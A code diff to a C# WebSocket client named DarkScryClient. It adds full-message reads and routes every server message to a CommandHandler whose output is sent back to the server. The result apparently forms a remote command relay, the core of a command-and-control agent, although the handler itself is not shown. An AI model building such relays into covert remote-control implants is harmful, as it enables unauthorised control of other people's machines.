@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Net.WebSockets;
 using System.Text;
 using System.Threading;
@@ -6,16 +7,18 @@ using System.Threading.Tasks;
 
 namespace DarkScryClient.Client
 {
-	internal class WsClient
+	internal class WsClient : IDisposable
 	{
 		private readonly Uri _serverUri;
 		private ClientWebSocket _websocket;
 		private bool _running;
+		private readonly CommandHandler _command;
 
 		public WsClient(string serverUri)
 		{
 			_serverUri = new Uri(serverUri);
 			_websocket = new ClientWebSocket();
+			_command = new CommandHandler();
 		}
 
 		public async Task StartAsync()
@@ -30,17 +33,13 @@ namespace DarkScryClient.Client
 
 		private async Task ReadLoopAsync()
 		{
-			var buffer = new byte[1024 * 4];
-
 			while (_running && _websocket.State == WebSocketState.Open)
 			{
-				WebSocketReceiveResult result;
+				string message;
 				try
 				{
-					result = await _websocket.ReceiveAsync(
-						new ArraySegment<byte>(buffer),
-						CancellationToken.None
-					);
+					message = await ReadFullMessageAsync();
+					if (message == null) break;
 				}
 				catch (WebSocketException wse)
 				{
@@ -48,31 +47,46 @@ namespace DarkScryClient.Client
 					break;
 				}
 
-				// If the server closed the connection, exit the loop.
-				if (result.MessageType == WebSocketMessageType.Close)
-				{
-					Console.WriteLine("Server initiated close. Closing...");
-					await _websocket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
-					break;
-				}
-
-				// Decode the message
-				string message = Encoding.UTF8.GetString(buffer, 0, result.Count);
-
-				// Run your command or callback here
-				_command(message);
+				await _command_handlar(message);
 			}
 
 			_running = false;
 			Console.WriteLine("Read loop ended.");
 		}
 
-		private async Task _command(string message)
+		private async Task<string> ReadFullMessageAsync()
 		{
-			// Replace this with whatever logic you need:
+			var buffer = new byte[1024 * 4];
+			var ms = new MemoryStream();
+
+			while (true)
+			{
+				WebSocketReceiveResult result = await _websocket.ReceiveAsync(
+					new ArraySegment<byte>(buffer),
+					CancellationToken.None
+				);
+
+				if (result.MessageType == WebSocketMessageType.Close)
+				{
+					Console.WriteLine("Server initiated close. Closing...");
+					await _websocket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
+					return null;
+				}
+
+				ms.Write(buffer, 0, result.Count);
+
+				if (result.EndOfMessage)
+					break;
+			}
+
+			return Encoding.UTF8.GetString(ms.ToArray());
+		}
+
+		private async Task _command_handlar(string message)
+		{
 			Console.WriteLine($"[WSClient] Received: {message}");
-			// For example, parse JSON, run local logic, etc.
-			await _websocket.SendAsync(new ArraySegment<byte>(Tools.StringToBytes("message")), WebSocketMessageType.Text, true, CancellationToken.None);
+			ArraySegment<byte> res = new ArraySegment<byte>(_command.RunCommand(message));
+			await _websocket.SendAsync(res, WebSocketMessageType.Text, true, CancellationToken.None);
 		}
 
 		public async Task StopAsync()
@@ -87,5 +101,9 @@ namespace DarkScryClient.Client
 			Console.WriteLine("WebSocket closed.");
 		}
 
+		public void Dispose()
+		{
+			_websocket?.Dispose();
+		}
 	}
 }
